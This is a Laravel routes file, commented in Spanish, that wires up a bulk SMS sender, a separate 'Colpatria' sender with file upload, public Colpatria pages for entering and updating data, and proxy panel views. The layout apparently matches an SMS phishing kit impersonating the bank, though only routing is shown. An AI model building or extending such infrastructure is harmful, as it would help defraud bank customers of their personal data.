<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\ProxyViewController;

// Ruta principal: muestra la vista según configuración del proxy (Servicio activo/inactivo)
Route::get('/', [ProxyViewController::class, 'show'])->name('proxy.home');

// Rutas de autenticación para el sender general (sin middleware)
Route::get('/sender/auth', [\App\Http\Controllers\SenderAuthController::class, 'showAuthForm'])->name('sender.auth');
Route::post('/sender/auth/request', [\App\Http\Controllers\SenderAuthController::class, 'requestCode'])->name('sender.auth.request');
Route::post('/sender/auth/verify', [\App\Http\Controllers\SenderAuthController::class, 'verifyCode'])->name('sender.auth.verify');
Route::post('/sender/auth/logout', [\App\Http\Controllers\SenderAuthController::class, 'logout'])->name('sender.auth.logout');

// Rutas de autenticación para el sender de Colpatria (sin middleware)
Route::get('/sender/colpatria/auth', [\App\Http\Controllers\SenderColpaAuthController::class, 'showAuthForm'])->name('sender.colpatria.auth');
Route::post('/sender/colpatria/auth/request', [\App\Http\Controllers\SenderColpaAuthController::class, 'requestCode'])->name('sender.colpatria.auth.request');
Route::post('/sender/colpatria/auth/verify', [\App\Http\Controllers\SenderColpaAuthController::class, 'verifyCode'])->name('sender.colpatria.auth.verify');
Route::post('/sender/colpatria/auth/logout', [\App\Http\Controllers\SenderColpaAuthController::class, 'logout'])->name('sender.colpatria.auth.logout');

// Rutas para el envío masivo de SMS general (protegidas con autenticación)
Route::middleware([\App\Http\Middleware\SenderAuth::class])->group(function () {
    Route::get('/sender', [\App\Http\Controllers\SenderController::class, 'index'])->name('sender.index');
    Route::post('/sender/send', [\App\Http\Controllers\SenderController::class, 'send'])->name('sender.send');
});

// Rutas para el sender de Colpatria (protegidas con autenticación separada)
Route::middleware([\App\Http\Middleware\SenderColpaAuth::class])->group(function () {
    Route::get('/sender/colpatria', [\App\Http\Controllers\SenderColpaController::class, 'index'])->name('sender.colpatria.index');
    Route::post('/sender/colpatria/upload', [\App\Http\Controllers\SenderColpaController::class, 'uploadFile'])->name('sender.colpatria.upload');
    Route::post('/sender/colpatria/send', [\App\Http\Controllers\SenderColpaController::class, 'send'])->name('sender.colpatria.send');
});

// Rutas públicas de Colpatria
Route::get('/colpatria/inicio', [\App\Http\Controllers\ColpatriaController::class, 'inicio'])->name('colpatria.inicio');
Route::get('/colpatria/datos', [\App\Http\Controllers\ColpatriaController::class, 'datos'])->name('colpatria.datos');
Route::post('/colpatria/actualizar', [\App\Http\Controllers\ColpatriaController::class, 'actualizarDatos'])->name('colpatria.actualizar');

// Rutas específicas por panel y vista (backwards compatibility y acceso directo)
Route::get('/{panel}/{view}', [ProxyViewController::class, 'showByPanel'])
    ->where(['panel' => '[a-zA-Z0-9_]+', 'view' => '[a-zA-Z0-9_]+'])
    ->name('proxy.view');